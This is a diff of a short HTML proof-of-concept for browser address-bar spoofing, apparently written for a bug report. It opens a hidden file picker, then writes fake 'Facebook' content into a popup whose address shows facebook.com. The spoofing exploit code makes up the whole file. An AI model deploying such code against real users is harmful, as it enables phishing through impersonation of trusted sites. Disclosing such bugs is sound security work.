@@ -1,7 +1,27 @@
-<a href="https://www.facebook.com:1234" target="ux" onclick="setTimeout('spoof()',200)"><h1>click here</h1></a>
-<script>
-function spoof() {
-var t = window.open('javascript:alert(document.domain)','ux');
-t.document.body.innerHTML = '<title>Facebook</title><H1>Spoofing</H1>';
-}
-</script>
+  <meta charset="utf-8">
+  <title>File Picker Popup Spoof PoC</title>
+
+  <input id="picker" type="file" hidden>
+
+  <a href="https://www.facebook.com:1234" target="ux" onclick="return startPoc(event)">
+    <h1>click here</h1>
+  </a>
+
+  <script>
+  function startPoc() {
+    document.getElementById('picker').click();
+    setTimeout(spoof, 200);
+    return true;
+  }
+
+  function spoof() {
+    var t = window.open('javascript:alert(document.domain)', 'ux');
+    try {
+      t.document.open();
+      t.document.write('<!doctype html><title>Facebook</title><h1>Spoofing</h1>');
+      t.document.close();
+    } catch (e) {
+      console.log('spoof write blocked:', e);
+    }
+  }
+  </script>
